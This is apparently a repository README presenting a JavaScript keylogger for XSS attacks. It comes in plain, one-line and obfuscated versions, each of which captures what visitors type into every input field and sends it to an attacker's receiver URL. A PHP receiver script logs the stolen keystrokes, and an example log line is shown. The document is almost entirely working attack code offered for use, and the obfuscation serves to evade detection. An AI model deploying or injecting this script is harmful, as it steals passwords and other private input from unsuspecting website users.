Simple Keylogger written in JavaScript to be used in XSS attacks
===

The script creates an event to detect the insertion of text in each text field of type "input" and sends the written content to the specified server that will have the second script called "receiver.php" running.

## JavaScript Source Code

*- Replace the `TYPE_THE_RECEIVER.PHP_URL_HERE` with the URL of the receiver script*

```javascript
var str = "";
var lastPress = Date.now();
var sent = true;
var declared = false;
var element = "";

var inputs = document.querySelectorAll('input');
for (i = 0; i < inputs.length; i++) {
    inputs[i].oninput = function(e) {
        str = e.target.value;
        element = e.target.outerHTML;
        sent = false;
        lastPress = Date.now();
    }
}

if (declared === false) {
    declared = true;
    var req = new XMLHttpRequest();
    window.setInterval(function() {
        if (sent === false && (Date.now() - lastPress) >= 2000) {
            sent = true;
            req.open("POST","TYPE_THE_RECEIVER.PHP_URL_HERE", true);
            req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            req.send("str="+btoa(element+" -> "+str));
        }
    }, 500);
}
```

## JavaScript One Line Source Code

*- Replace the `TYPE_THE_RECEIVER.PHP_URL_HERE` with the URL of the receiver script*

```javascript
var str="";var lastPress=Date.now();var sent=true;var declared=false;var element="";var inputs=document.querySelectorAll('input');for(i=0;i<inputs.length;i++){inputs[i].oninput=function(e){str=e.target.value;element=e.target.outerHTML;sent=false;lastPress=Date.now()}}if(declared===false){declared=true;var req=new XMLHttpRequest();window.setInterval(function(){if(sent===false&&(Date.now()-lastPress)>=2000){sent=true;req.open("POST","TYPE_THE_RECEIVER.PHP_URL_HERE",true);req.setRequestHeader("Content-type","application/x-www-form-urlencoded");req.send("str="+btoa(element+" -> "+str))}},500)}
```

## JavaScript Ofuscated Source Code

*- Replace the `TYPE_THE_RECEIVER.PHP_URL_HERE` with the URL of the receiver script*

```javascript
var _0x46009d=_0x1166;(function(_0x5240e0,_0xa2a147){var _0x2b658c=_0x1166,_0x471711=_0x5240e0();while(!![]){try{var _0x2785e6=-parseInt(_0x2b658c(0xdc))/0x1*(parseInt(_0x2b658c(0xdf))/0x2)+-parseInt(_0x2b658c(0xd9))/0x3+-parseInt(_0x2b658c(0xdb))/0x4+-parseInt(_0x2b658c(0xe2))/0x5+-parseInt(_0x2b658c(0xeb))/0x6+parseInt(_0x2b658c(0xde))/0x7*(-parseInt(_0x2b658c(0xe5))/0x8)+parseInt(_0x2b658c(0xdd))/0x9;if(_0x2785e6===_0xa2a147)break;else _0x471711['push'](_0x471711['shift']());}catch(_0x5579f9){_0x471711['push'](_0x471711['shift']());}}}(_0x1591,0x629fd));var str='',lastPress=Date[_0x46009d(0xe8)](),sent=!![],declared=![],element='',inputs=document[_0x46009d(0xda)](_0x46009d(0xd5));for(i=0x0;i<inputs[_0x46009d(0xd8)];i++){inputs[i][_0x46009d(0xe3)]=function(_0x37b8b9){var _0x83cbfa=_0x46009d;str=_0x37b8b9[_0x83cbfa(0xe9)][_0x83cbfa(0xd6)],element=_0x37b8b9[_0x83cbfa(0xe9)][_0x83cbfa(0xd7)],sent=![],lastPress=Date[_0x83cbfa(0xe8)]();};}function _0x1591(){var _0x4419c4=['str=','open','2552125XAdCtV','oninput','setInterval','589216BpoPwR','TYPE_THE_RECEIVER.PHP_URL_HERE','application/x-www-form-urlencoded','now','target','send','2332524ujwUnQ','input','value','outerHTML','length','908493niXoGr','querySelectorAll','2406004KvWXcB','16739DEdXzG','28635201KKIsoe','56tjjgLb','46uBySdK'];_0x1591=function(){return _0x4419c4;};return _0x1591();}function _0x1166(_0x31ece7,_0x2e443e){var _0x159156=_0x1591();return _0x1166=function(_0x116607,_0x4a095d){_0x116607=_0x116607-0xd5;var _0x226807=_0x159156[_0x116607];return _0x226807;},_0x1166(_0x31ece7,_0x2e443e);}if(declared===![]){declared=!![];var req=new XMLHttpRequest();window[_0x46009d(0xe4)](function(){var _0x40b287=_0x46009d;sent===![]&&Date[_0x40b287(0xe8)]()-lastPress>=0x7d0&&(sent=!![],req[_0x40b287(0xe1)]('POST',_0x40b287(0xe6),!![]),req['setRequestHeader']('Content-type',_0x40b287(0xe7)),req[_0x40b287(0xea)](_0x40b287(0xe0)+btoa(element+'\x20->\x20'+str)));},0x1f4);}
```

## PHP Source Code

```php
<?php
    header('Access-Control-Allow-Origin: *');
    if (isset($_POST['str']) && strlen($_POST['str']) > 0) {
        file_put_contents("keylog.log", date('Y/m/d h:i:s')." | ".base64_decode($_POST['str']).PHP_EOL, FILE_APPEND);
    }
?>
```

## Log Output Example

```
2022/01/02 07:50:48 | <input type="text" id="inputTestId" name="inputTestName" class="inputTestClass"> -> This is a log example
```
